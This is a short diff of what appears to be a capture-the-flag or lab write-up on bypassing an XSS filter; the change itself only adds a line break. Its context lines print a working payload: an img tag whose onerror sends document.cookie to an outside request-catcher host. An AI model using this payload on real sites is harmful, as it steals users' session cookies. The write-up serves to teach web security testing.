@@ -8,7 +8,7 @@ This returns:<br />
 HACKER ALERT!
 
 So there is some checking for xss going on.
-This can get very tricky as i found out last year however the first thing I checked already worked out:
+This can get very tricky as i found out last year however the first thing I checked already worked out:<br />
 Using an img tag with an onerror that executes javascript is another very common way to inject javascript and this does work:<br />
 \<img src=X onerror='location.href="https://paulovh.free.beeceptor.com?"+ document.cookie'/\>
 
